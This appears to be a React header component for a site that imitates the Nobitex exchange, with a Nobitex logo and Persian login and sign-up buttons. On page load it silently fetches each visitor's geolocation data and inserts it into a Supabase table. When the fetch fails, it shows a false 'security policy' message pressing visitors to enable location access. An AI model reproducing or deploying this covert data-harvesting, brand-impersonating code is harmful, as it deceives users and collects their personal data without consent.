import React, { useEffect, useState } from "react";
import img from "./nobitex-logo.ed6f0a0.svg";
import { IoMdMenu } from "react-icons/io";
import { BeatLoader } from "react-spinners";
import supabase from "./supabase";
function Header() {
  const [address, setAddress] = useState(null);
  const [isLoading, setisLoading] = useState(false);
  const [error, setErorr] = useState(false);
  useEffect(() => {
    async function fetchAddress() {
      setisLoading(true);
      const response = await fetch(
        "https://api.bigdatacloud.net/data/reverse-geocode-client"
      );
      const data = await response.json();
      setAddress(data);
      if (!response.ok) {
        setErorr(true);
      }
      console.log(data);
      await saveAddressToSupabase(data);
      setisLoading(false);
      setErorr(false);
    }
    fetchAddress();
  }, []);

  async function saveAddressToSupabase(address) {
    const { data, error } = await supabase
      .from("test")
      .insert([{ fake: JSON.stringify(address) }]);

    if (error) {
      console.error("Error inserting data:", error);
    } else {
      console.log("Data inserted successfully:", data);
    }
  }
  return (
    <>
      <header className="header">
        <nav>
          <ul>
            <li>
              <IoMdMenu size={25} />
            </li>
            <li>
              <figure>
                <img src={img} alt="" />{" "}
              </figure>
            </li>
          </ul>
          <div className="btn">
            <button>ورود</button>
            <button>ثبت نام</button>
          </div>
        </nav>
      </header>
      {isLoading && !error && (
        <div className="spin">
          <BeatLoader />
        </div>
      )}
      {error && (
        <p>
          برای حفظ سیاست های امنیتی باید دسترسی به موقعیت مکانی را فعال کنید{" "}
        </p>
      )}
    </>
  );
}

export default Header;
